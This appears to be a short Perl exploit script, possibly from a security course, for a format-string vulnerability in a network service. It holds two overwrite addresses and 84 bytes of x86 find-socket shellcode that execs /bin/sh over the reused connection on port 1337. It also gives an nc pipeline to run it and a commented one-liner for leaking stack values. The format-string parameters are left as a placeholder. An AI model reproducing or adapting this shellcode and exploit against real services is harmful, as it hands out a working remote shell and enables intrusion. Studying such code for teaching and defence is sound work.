#!/usr/bin/perl
# This Program provides a shell for a format string exploit
#
## Leander Metcalf
## 30 November 2014
#
### Run this program as follows:
###     ./exploit.pl | nc -p 1337 0.0.0.0 4444
###	if the port needs to be changed edit the port below
#

# Make sure input is not buffered
$| = 1; 

$upper="\x5a\x9f\x04\x08";
$lower="\x58\x9f\x04\x08";
$port="\x05\x39";	#port 0x0539 = 1337 in decimal

my $sc =
"\x31\xdb\xf7\xe3\x53\x89\xe2\x6a\x10\x54\x52\x53\x89\xe1\xb3" . 
"\x07\xb0\x66\xcd\x80\x31\xdb\x66\x39\xd8\x75\x0c\x66\xbb" . 
"$port" .
"\x8b\x7a\x02\x66\x39\xfb\x74\x07\x31\xc0\x5b\x43\x53\xeb" . 
"\xe0\x5b\x31\xc9\xb1\x03\xb0\x3f\x66\x49\xcd\x80\x66\x41\xe2" . 
"\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50" . 
"\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x41";
# Shellcode Length: 84
# cport = 1337

# Uncomment to find possible leaks:
# perl -e '@abc = (1..10, 60..70); foreach (@abc)
# { print "%" . "$abc[$i]\$x "; $i++;}' | nc 0.0.0.0 4444

print $sc . $upper . $lower . "Format String Exploit Parameters Go Here" . "\x0a";

# Uncomment this section and then pipe the vulnerable program
# to show a shell working if neccessary
# Use ./find_sock.pl | nc -p 1337 0.0.0.0 4444
while (<>){
    print;
}
